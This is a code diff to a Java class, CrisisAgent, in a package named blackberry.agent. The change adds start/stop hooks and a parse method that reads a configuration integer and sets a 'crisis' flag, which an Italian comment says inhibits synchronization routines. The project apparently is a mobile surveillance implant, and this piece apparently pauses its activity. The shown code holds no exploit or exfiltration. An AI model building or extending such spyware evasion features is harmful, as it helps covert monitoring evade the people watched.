@@ -9,6 +9,10 @@
  * *************************************************/
 package blackberry.agent;
 
+import java.io.EOFException;
+
+import net.rim.device.api.util.DataBuffer;
+import blackberry.Status;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
@@ -29,6 +33,8 @@ public final class CrisisAgent extends Agent {
     public static final int SYNC = 0x10; // Inibisci tutte le routine di sincronizzazione
     public static final int ALL = 0xffffffff; // Per retrocompatibilita'
 
+    int type;
+    
     /**
      * Instantiates a new crisis agent.
      * 
@@ -60,13 +66,42 @@ public final class CrisisAgent extends Agent {
 
     }
 
+    public void actualStart() {
+        Status.getInstance().startCrisis();        
+    }
+    public void actualStop() {
+        Status.getInstance().stopCrisis();      
+    }
+    
     /*
      * (non-Javadoc)
      * @see blackberry.agent.Agent#parse(byte[])
      */
     protected boolean parse(final byte[] confParameters) {
-        // TODO Auto-generated method stub
-        return false;
+        
+        if( confParameters.length == 0){
+            // backward compatibility
+            Status.getInstance().setCrisis(0xffffffff);
+            return true;
+        }
+        
+        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
+                confParameters.length, false);
+        
+        try {            
+            type = databuffer.readInt();
+        } catch (final EOFException e) {
+            return false;
+        }
+
+        // #ifdef DEBUG_INFO
+        debug.info("type: " + type);
+        // #endif
+        
+      
+        Status.getInstance().setCrisis(type);
+        
+        return true;
     }
 
 }
